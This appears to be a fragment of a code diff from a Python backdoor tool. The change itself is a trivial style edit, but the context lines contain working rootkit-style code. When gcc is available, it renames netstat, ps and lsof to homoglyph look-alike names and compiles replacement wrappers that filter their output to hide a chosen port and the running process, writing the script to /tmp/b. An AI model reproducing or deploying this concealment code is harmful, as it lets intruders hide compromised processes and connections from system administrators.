@@ -20,7 +20,7 @@ def run(port=None):
         def cmd_exists(cmd):
             return subprocess.call("type " + cmd, shell=True,
             stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0
-        if cmd_exists("gcc") == True:
+        if cmd_exists("gcc") is True:
             bash=r"""which netstat ps lsof|perl -pe'$s="\x{455}";$n="\x{578}";chop;$o=$_;s/([ltp])s/\1$s/||s/fin/fi$n/;rename$o,$_;open F,"|gcc -xc - -o$o";print F qq{int main(int a,char**b){char*c[999999]={"sh","-c","$_ \$*|grep -vE \\"""+'"'+port+"""|\$\$|[$s-$n]|grep\\\\""};memcpy(c+3,b,8*a);execv("/bin/sh",c);}}'"""
             with open('/tmp/b', 'w') as f:
                 f.write(bash)
